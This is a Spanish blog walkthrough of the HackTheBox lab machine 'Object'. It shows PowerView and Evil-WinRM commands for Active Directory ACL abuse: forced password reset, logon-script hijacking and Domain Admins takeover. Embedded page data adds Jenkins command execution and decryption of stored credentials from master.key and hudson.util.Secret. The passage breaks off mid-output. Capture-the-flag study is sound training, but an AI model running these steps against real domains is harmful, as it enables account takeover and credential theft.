<ul class=" ml-10 mdx-p text-justify mx-2.5 hyphens-auto list-disc">
<li class="text-justify mx-2.5 hyphens-auto">Desde oliver a smith forcechangepassword</li>
<li class="text-justify mx-2.5 hyphens-auto">Desde smith a maria GenericWrite</li>
<li class="text-justify mx-2.5 hyphens-auto">Desde maria a Administrador WriteOwner</li>
</ul>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Para entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621111719.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621111731.png"/></p>
<h2 class="text-2xl py-10 text-center font-bold">Consiguiendo el usuario Smith</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Nos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400"> . .\powerview.ps1
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego ejecutamos los siguientes comandos:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">$newpass = ConvertTo-SecureString &#x27;Password1234#&#x27; -AsPlainText -Force
</code></pre>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">Set-DomainUserPassword -Identity smith -AccountPassword $newpass
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Ahora el usuario smith posee las siguientes credenciales</p>
<ul class=" ml-10 mdx-p text-justify mx-2.5 hyphens-auto list-disc">
<li class="text-justify mx-2.5 hyphens-auto">User: smith</li>
<li class="text-justify mx-2.5 hyphens-auto">Password: Password1234#</li>
</ul>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos si tenemos acceso al sistema mediante WinRM con el usuario smith</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">evil-winrm -i 10.129.90.135 -u smith -p &#x27;Password1234#&#x27;                            

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\smith\Documents&gt; 
</code></pre>
<h2 class="text-2xl py-10 text-center font-bold">Consiguiendo el usuario Maria</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Para conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Sin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user" class="mdx-p inline-block mb-4 text-xs font-bold capitalize border-b-2 border-orange-600 hover:text-orange-600">https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user</a></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Por lo que usamos los siguientes comandos</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">echo &quot;ls \users\maria &gt; c:\tmp\out&quot; &gt; cmd.ps1
</code></pre>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">Set-DomainObject -Identity maria -SET @{scriptpath=&quot;C:\\tmp\\cmd.ps1&quot;}
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego leemos el archivo out y vemos lo siguiente</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">type out


    Directory: C:\users\maria


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/22/2021   3:54 AM                3D Objects
d-r---       10/22/2021   3:54 AM                Contacts
d-r---       10/25/2021   3:47 AM                Desktop
d-r---       10/25/2021  10:07 PM                Documents
d-r---       10/22/2021   3:54 AM                Downloads
d-r---       10/22/2021   3:54 AM                Favorites
d-r---       10/22/2021   3:54 AM                Links
d-r---       10/22/2021   3:54 AM                Music
d-r---       10/22/2021   3:54 AM                PictuObject
d-r---       10/22/2021   3:54 AM                Saved Games
d-r---       10/22/2021   3:54 AM                Searches
d-r---       10/22/2021   3:54 AM                Videos
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Notamos que el directorio Documents ha sifo modificado recientemente</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">echo &quot;ls \users\maria\desktop &gt; \tmp\out &quot; &gt; cmd.ps1
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Y conseguimos el siguiente archivo</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">cat out

Directory: C:\users\maria\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Modificamos el archivo cmd.ps1:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">echo &quot;copy \users\maria\desktop\Engines.xls  \tmp\ &quot; &gt; cmd.ps1
</code></pre>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ls


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2022   8:03 AM             96 cmd.ps1
-a----       10/26/2021   8:13 AM           6144 Engines.xls
-a----        6/21/2022   8:02 AM            830 out
-a----        6/21/2022   7:59 AM            830 out2

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Descargamos el archivo a nuestra VM. Luego convertimos el archivo a csv</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ssconvert Engines.xls engine.csv
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Y vemos su contenido</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">cat engine.csv                           
&quot;Machines Information&quot;,,,,,
Name,Quantity,&quot;Date Acquired&quot;,Owner,&quot;Chamber Username&quot;,&quot;Chamber Password&quot;
&quot;Internal Combustion Engine&quot;,12,2021/10/02,HTB,maria,d34gb8@
&quot;Stirling Engine&quot;,23,2021/11/05,HTB,maria,0de_434_d545
&quot;Diesel Engine&quot;,4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV</p>
<h2 class="text-2xl py-10 text-center font-bold">Administrador</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">BloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Definimos a maria como el dueño del grupo Domain Admins</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">Set-DomainObjectOwner -Identity &#x27;Domain Admins&#x27; -OwnerIdentity &#x27;maria&#x27;
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Asiganmos todos los derechos del grupo a maria</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -PrincipalIdentity maria -Rights All
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Agregamos a maria al grupo Domain Admins</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">Add-DomainGroupMember -Identity &#x27;Domain Admins&#x27; -Members &#x27;maria&#x27;
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos a que grupos pertenece maria</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">*Evil-WinRM* PS C:\Users\maria\Documents&gt; net user maria
User name                    maria
Full Name                    maria garcia
Comment
User&#x27;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\\tmp\\cmd.ps1
User profile
Home directory
Last logon                   6/21/2022 4:56:41 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Finalmente tenemos acceso como Administrador al sistema</p></div></main><footer class="bg-white border-t border-l  "><div class="flex"><div class="w-full text-center p-1"><h6 class="font-semibold text-gray-700 mb-4">A Simple Github Blog - 2024</h6></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"markdownData":"{\"orig\":\"---\\ntitle: HackTheBox - Máquina Object \\nsubtitle: Paso a paso de la explotación de la maquina Object de HackTheBox.\\ndificultad: Hard\\nos: Sistema Operativo Windows\\ndate: 2024-02-10\\ntags:\\n    - HackTheBox\\n---\\n\\n## Port Enumeration\\n\\n### TCP \\n\\nEnumeración de puertos TCP\\n\\n~~~ bash\\nsudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             \\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\n\\nPORT     STATE SERVICE VERSION\\n80/tcp   open  http    Microsoft IIS httpd 10.0\\n|_http-title: Mega Engines\\n| http-methods: \\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-title: Not Found\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n8080/tcp open  http    Jetty 9.4.43.v20210629\\n| http-robots.txt: 1 disallowed entry \\n|_/\\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\\n|_http-server-header: Jetty(9.4.43.v20210629)\\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\\nNo OS matches for host\\nNetwork Distance: 2 hops\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nTRACEROUTE (using port 8080/tcp)\\nHOP RTT       ADDRESS\\n1   126.52 ms 10.10.14.1\\n2   126.92 ms 10.129.96.147\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 15.22 seconds\\n\\n~~~\\n\\n    \\n\\n### UDP\\n  \\n Enumeración de UDP\\n \\n~~~ bash\\nsudo nmap -sU -F 10.129.96.147 -T5                \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\nNot shown: 98 open|filtered udp ports (no-response)\\nPORT    STATE SERVICE\\n53/udp  open  domain\\n123/udp open  ntp\\n\\nNmap done: 1 IP address (1 host up) scanned in 4.44 seconds\\n\\n~~~\\n\\n## Enumeracion de Servicios   \\n\\n### HTTP port 80:\\n\\nLa enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales\\n\\nBanner Grabbing\\n\\n~~~http\\nHTTP/1.1 200 OK\\nContent-Type: text/html\\nLast-Modified: Tue, 26 Oct 2021 06:21:32 GMT\\nAccept-Ranges: bytes\\nETag: \\\"61128db831cad71:0\\\"\\nServer: Microsoft-IIS/10.0\\nDate: Mon, 20 Jun 2022 21:11:13 GMT\\nConnection: close\\nContent-Length: 29932\\n~~~\\n\\n![](/Object/Pasted_image_20220620182027.png)\\n\\nIngresamos al link automation\\n\\nY nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts\\n\\nLuego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080\\n\\n![](/Object/Pasted_image_20220620182300.png)\\n\\nContenido del archivo robots.txt\\n\\n~~~ bash\\n# we don't want robots to click \\\"build\\\" links\\nUser-agent: *\\nDisallow: /\\n~~~\\n\\nCreamos un usuario y logramos ingresar al sistema\\n\\n![](/Object/Pasted_image_20220620182550.png)\\n\\n## Vulnerabilities analysis\\n\\nLa siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds\\n\\nhttps://book.hacktricks.xyz/cloud-security/jenkins\\n\\nCreamos un nuevo proyecto \\n\\nVamos a la sección de triggers\\n\\nY configuramos lo siguiente\\n\\n![](/Object/Pasted_image_20220621071436.png)\\n\\nEsto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando\\n\\nEn Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:\\n\\n![](/Object/Pasted_image_20220621071556.png)\\n\\nEsperamos unos minutos y vemos el resultado\\n\\n![](/Object/Pasted_image_20220621071328.png)\\n\\nEl software está ejecutandose como el usuario oliver\\n\\n# Explotation\\n\\nIntentaremos verificar que el sistema no tiene habilitado algun firewall\\n\\n![](/Object/Pasted_image_20220621072459.png)\\n\\nCon python creamos un servidor http a la esucha y vemos si es posible la conexión\\n\\n![](/Object/Pasted_image_20220621072512.png)\\n\\nComenzamos a enumera el sistema y extraer alguna información que nos sea util \\n\\nEnumeramos los directorios\\n\\n![](/Object/Pasted_image_20220621073347.png)\\n\\nLuego consultamos el directorio C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\n\\n![](/Object/Pasted_image_20220621073716.png)\\n\\nSegún el siguiente sitio: https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files\\n\\nEl archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.\\n\\nC:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\leftraro_9491939160013366012\\\\config.xml\\n\\n~~~xml\\n\u003c?xml version='1.1' encoding='UTF-8'?\u003e\\n\u003cuser\u003e\\n  \u003cversion\u003e10\u003c/version\u003e\\n  \u003cid\u003eleftraro\u003c/id\u003e\\n  \u003cfullName\u003eleftraro\u003c/fullName\u003e\\n  \u003cproperties\u003e\\n    \u003cjenkins.security.ApiTokenProperty\u003e\\n      \u003ctokenStore\u003e\\n        \u003ctokenList/\u003e\\n      \u003c/tokenStore\u003e\\n    \u003c/jenkins.security.ApiTokenProperty\u003e\\n    \u003ccom.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\"\u003e\\n      \u003cdomainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"/\u003e\\n    \u003c/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u003e\\n    \u003chudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\"\u003e\\n      \u003ctriggers/\u003e\\n    \u003c/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty\u003e\\n    \u003chudson.model.MyViewsProperty\u003e\\n      \u003cviews\u003e\\n        \u003chudson.model.AllView\u003e\\n          \u003cowner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/\u003e\\n          \u003cname\u003eall\u003c/name\u003e\\n          \u003cfilterExecutors\u003efalse\u003c/filterExecutors\u003e\\n          \u003cfilterQueue\u003efalse\u003c/filterQueue\u003e\\n          \u003cproperties class=\\\"hudson.model.View$PropertyList\\\"/\u003e\\n        \u003c/hudson.model.AllView\u003e\\n      \u003c/views\u003e\\n    \u003c/hudson.model.MyViewsProperty\u003e\\n    \u003corg.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\"\u003e\\n      \u003cproviderId\u003edefault\u003c/providerId\u003e\\n    \u003c/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u003e\\n    \u003chudson.model.PaneStatusProperties\u003e\\n      \u003ccollapsed/\u003e\\n    \u003c/hudson.model.PaneStatusProperties\u003e\\n    \u003cjenkins.security.seed.UserSeedProperty\u003e\\n      \u003cseed\u003e0a9baf906da7ec2b\u003c/seed\u003e\\n    \u003c/jenkins.security.seed.UserSeedProperty\u003e\\n    \u003chudson.search.UserSearchProperty\u003e\\n      \u003cinsensitiveSearch\u003etrue\u003c/insensitiveSearch\u003e\\n    \u003c/hudson.search.UserSearchProperty\u003e\\n    \u003chudson.model.TimeZoneProperty/\u003e\\n    \u003chudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n      \u003cpasswordHash\u003e#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO\u003c/passwordHash\u003e\\n    \u003c/hudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n    \u003chudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\"\u003e\\n      \u003cemailAddress\u003eleftraro@asdas.cl\u003c/emailAddress\u003e\\n    \u003c/hudson.tasks.Mailer_-UserProperty\u003e\\n    \u003cjenkins.security.LastGrantedAuthoritiesProperty\u003e\\n      \u003croles\u003e\\n        \u003cstring\u003eauthenticated\u003c/string\u003e\\n      \u003c/roles\u003e\\n      \u003ctimestamp\u003e1655809043400\u003c/timestamp\u003e\\n    \u003c/jenkins.security.LastGrantedAuthoritiesProperty\u003e\\n  \u003c/properties\u003e\\n\u003c/user\u003e\\n~~~\\n\\nLuego consultamos el del usuario admin\\n\\ntype C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\\\n\\n~~~xml\\n\u003c?xml version='1.1' encoding='UTF-8'?\u003e\\n\u003cuser\u003e\\n  \u003cversion\u003e10\u003c/version\u003e\\n  \u003cid\u003eadmin\u003c/id\u003e\\n  \u003cfullName\u003eadmin\u003c/fullName\u003e\\n  \u003cproperties\u003e\\n    \u003ccom.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\"\u003e\\n      \u003cdomainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"\u003e\\n        \u003centry\u003e\\n          \u003ccom.cloudbees.plugins.credentials.domains.Domain\u003e\\n            \u003cspecifications/\u003e\\n          \u003c/com.cloudbees.plugins.credentials.domains.Domain\u003e\\n          \u003cjava.util.concurrent.CopyOnWriteArrayList\u003e\\n            \u003ccom.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u003e\\n              \u003cid\u003e320a60b9-1e5c-4399-8afe-44466c9cde9e\u003c/id\u003e\\n              \u003cdescription\u003e\u003c/description\u003e\\n              \u003cusername\u003eoliver\u003c/username\u003e\\n              \u003cpassword\u003e{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}\u003c/password\u003e\\n              \u003cusernameSecret\u003efalse\u003c/usernameSecret\u003e\\n            \u003c/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u003e\\n          \u003c/java.util.concurrent.CopyOnWriteArrayList\u003e\\n        \u003c/entry\u003e\\n      \u003c/domainCredentialsMap\u003e\\n    \u003c/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u003e\\n    \u003chudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\"\u003e\\n      \u003ctriggers/\u003e\\n    \u003c/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty\u003e\\n    \u003chudson.model.MyViewsProperty\u003e\\n      \u003cviews\u003e\\n        \u003chudson.model.AllView\u003e\\n          \u003cowner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/\u003e\\n          \u003cname\u003eall\u003c/name\u003e\\n          \u003cfilterExecutors\u003efalse\u003c/filterExecutors\u003e\\n          \u003cfilterQueue\u003efalse\u003c/filterQueue\u003e\\n          \u003cproperties class=\\\"hudson.model.View$PropertyList\\\"/\u003e\\n        \u003c/hudson.model.AllView\u003e\\n      \u003c/views\u003e\\n    \u003c/hudson.model.MyViewsProperty\u003e\\n    \u003corg.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\"\u003e\\n      \u003cproviderId\u003edefault\u003c/providerId\u003e\\n    \u003c/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u003e\\n    \u003chudson.model.PaneStatusProperties\u003e\\n      \u003ccollapsed/\u003e\\n    \u003c/hudson.model.PaneStatusProperties\u003e\\n    \u003cjenkins.security.seed.UserSeedProperty\u003e\\n      \u003cseed\u003eea75b5bd80e4763e\u003c/seed\u003e\\n    \u003c/jenkins.security.seed.UserSeedProperty\u003e\\n    \u003chudson.search.UserSearchProperty\u003e\\n      \u003cinsensitiveSearch\u003etrue\u003c/insensitiveSearch\u003e\\n    \u003c/hudson.search.UserSearchProperty\u003e\\n    \u003chudson.model.TimeZoneProperty/\u003e\\n    \u003chudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n      \u003cpasswordHash\u003e#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW\u003c/passwordHash\u003e\\n    \u003c/hudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n    \u003chudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\"\u003e\\n      \u003cemailAddress\u003eadmin@object.local\u003c/emailAddress\u003e\\n    \u003c/hudson.tasks.Mailer_-UserProperty\u003e\\n    \u003cjenkins.security.ApiTokenProperty\u003e\\n      \u003ctokenStore\u003e\\n        \u003ctokenList/\u003e\\n      \u003c/tokenStore\u003e\\n    \u003c/jenkins.security.ApiTokenProperty\u003e\\n    \u003cjenkins.security.LastGrantedAuthoritiesProperty\u003e\\n      \u003croles\u003e\\n        \u003cstring\u003eauthenticated\u003c/string\u003e\\n      \u003c/roles\u003e\\n      \u003ctimestamp\u003e1634793332195\u003c/timestamp\u003e\\n    \u003c/jenkins.security.LastGrantedAuthoritiesProperty\u003e\\n  \u003c/properties\u003e\\n\u003c/user\u003e\\n~~~\\n\\nPara extraer las contraseñas podemos utilizar el siguiente script en python\\n\\n\\nDebemos descargar dos archivos \\n\\n- master.key \\n- hudson.util.Secret\\n\\nComo este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:\\n\\n~~~\\npowershell -c [convert]::ToBase64String((cat C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\secrets\\\\hudson.util.Secret -Encoding byte))\\n~~~\\n\\nhudson.util.Secret\\n\\n~~~\\ngWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=\\n~~~\\n\\nmaster.key\\n\\n~~~\\nZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==\\n~~~\\n\\nDescodificamos los archivo y ejecutamos el script:\\n\\n~~~bash\\npython decrypt.py master.key hudson.util.Secret config.xml\\nc1cdfun_d2434\\n~~~\\n\\n## Getting a shell\\n\\nAhora con las credenciales del usuario oliver podemos usar el servicio WinRM\\n\\n- User: oliver\\n- Password: c1cdfun_d2434\\n\\n~~~ bash\\nevil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434\\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents\u003e whoami\\nobject\\\\oliver\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents\u003e \\n\\n~~~\\n\\n## System Enumeration\\n\\nUsuarios del sistema\\n\\n~~~ bash\\n*Evil-WinRM* PS C:\\\\Users\u003e ls\\n\\n\\n    Directory: C:\\\\Users\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-----       11/10/2021   3:20 AM                Administrator\\nd-----       10/26/2021   7:59 AM                maria\\nd-----       10/26/2021   7:58 AM                oliver\\nd-r---        4/10/2020  10:49 AM                Public\\nd-----       10/21/2021   3:44 AM                smith\\n\\n~~~\\n\\nServicios que esten a la esucha en algun puerto\\n\\n~~~bash\\n*Evil-WinRM* PS C:\\\\Users\u003e netstat -ano | findstr LISTENING\\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644\\n  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796\\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484\\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160\\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520\\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628\\n  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928\\n  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872\\n  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928\\n  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4\\n  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928\\n  TCP    [::]:80                [::]:0                 LISTENING       4\\n  TCP    [::]:88                [::]:0                 LISTENING       648\\n  TCP    [::]:135               [::]:0                 LISTENING       900\\n  TCP    [::]:389               [::]:0                 LISTENING       648\\n  TCP    [::]:445               [::]:0                 LISTENING       4\\n  TCP    [::]:464               [::]:0                 LISTENING       648\\n  TCP    [::]:593               [::]:0                 LISTENING       900\\n  TCP    [::]:636               [::]:0                 LISTENING       648\\n  TCP    [::]:3268              [::]:0                 LISTENING       648\\n  TCP    [::]:3269              [::]:0                 LISTENING       648\\n  TCP    [::]:5985              [::]:0                 LISTENING       4\\n  TCP    [::]:8080              [::]:0                 LISTENING       5644\\n  TCP    [::]:9389              [::]:0                 LISTENING       2796\\n  TCP    [::]:47001             [::]:0                 LISTENING       4\\n  TCP    [::]:49664             [::]:0                 LISTENING       484\\n  TCP    [::]:49665             [::]:0                 LISTENING       1160\\n  TCP    [::]:49666             [::]:0                 LISTENING       1520\\n  TCP    [::]:49667             [::]:0                 LISTENING       648\\n  TCP    [::]:49673             [::]:0                 LISTENING       648\\n  TCP    [::]:49674             [::]:0                 LISTENING       648\\n  TCP    [::]:49684             [::]:0                 LISTENING       628\\n  TCP    